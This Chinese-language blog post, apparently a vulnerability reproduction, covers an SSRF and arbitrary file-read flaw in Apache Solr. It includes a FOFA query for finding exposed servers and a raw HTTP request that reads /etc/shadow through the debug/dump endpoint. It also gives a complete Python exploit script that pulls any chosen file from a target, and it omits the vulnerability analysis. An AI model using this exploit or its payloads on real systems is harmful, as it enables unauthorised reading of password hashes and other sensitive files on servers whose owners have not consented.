# Apache Solr SSRF与任意文件读取漏洞




# 前言

Apache Solr是一个开源的搜索服务，使用Java语言开发，基于Lucene的全文搜索服务器。

Apache Solr全版本存在一个SSRF与任意文件读取漏洞，因Apache Solr整体默认安装为未授权，且大部分资产都为未授权，提供众多api接口，支持未授权用户通过config api更改配置文件，攻击面较大。建议相关用户及时采取措施阻止攻击。



# 影响范围

Apache Solr 所有版本





# 漏洞复现

**fofa查询资产关键字：**

```
app="APACHE-Solr"
```



**1.首先访问目标url拼接下面的路径，获取实例对象的名称**

```bash
/solr/admin/cores?indexInfo=false&wt=json
```



![获取实例名称](http://image.xpshuai.cn/solr_instance.png)

如图，可以得到实例对象的名称为`Tourist-guide-Server`





**2.构造路径**

```bash
/solr/".iii."/debug/dump?param=ContentStreams&wt=json
```

其中`iii`就是我们前面得到的实例对象的名称
这里，我们构造之后为下面这个(这个地址作为post请求的地址)：

```bash
/solr/Tourist-guide-Server/debug/dump?param=ContentStreams&wt=json
```



而post数据中的body的内容为：`stream.url=file:///etc/passwd`

即(**发送这个数据包**)：

```bash
POST /solr/Tourist-guide-Server/debug/dump?param=ContentStreams&wt=json HTTP/1.1
Host: IP:PORT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

stream.url=file:///etc/shadow
```



![读取文件](http://image.xpshuai.cn/solr_ok.png)







# 漏洞分析

略





# EXP

```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import requests
import json
import urllib
import time
import re
def Getins(url):
    try:
        ins=""
        url = url+"solr/admin/cores?indexInfo=false&wt=json"
        response = requests.get(url=url)
        data = str(response.text)
        ins = re.findall(r'\"name\":\"(.+?)\",',data)[0]
        return(ins)
    except IndexError:
        return("")

def Getfile(url,ins,filename):
    try:
        url = url+"solr/"+ins+"/debug/dump?param=ContentStreams&wt=json"
        headers ={
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        payload = str("stream.url=file://"+filename)
        response = requests.post(url=url,headers=headers,data=payload)
        data = str(response.text)
        test = re.findall(r'\"stream\":\"(.+?)\"\}]',data)[0]
        print(test.replace(r"\n","\n"))
    except IndexError:
        print("不能读取此文件")
        

if __name__ == '__main__':
    url = input("请输入测试地址:")
    filename = input("请输入读取的文件路径:")
    ins=Getins(url)
    if(ins == ""):
        print("不存在漏洞")
    else:
        Getfile(url,ins,filename)
```

读取效果：

![exp效果](http://image.xpshuai.cn/solrexp.png)

---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/apache-solr-ssrf%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/  

